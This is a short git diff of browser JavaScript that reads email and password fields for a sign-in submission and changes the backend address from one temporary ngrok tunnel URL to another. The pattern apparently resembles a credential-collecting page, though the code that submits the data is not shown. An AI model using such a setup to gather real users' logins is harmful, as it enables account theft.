@@ -7,7 +7,7 @@ var fields = document.querySelectorAll("#inputEmail, #inputPassword")
 var sign_in_detals = {}
 
 const Config = {
-    HOST_URL:"https://847a-154-161-13-158.ngrok-free.app"
+    HOST_URL:`https://9c08-154-161-146-6.ngrok-free.app`
 }
 
 function submit_sign_in_details(){
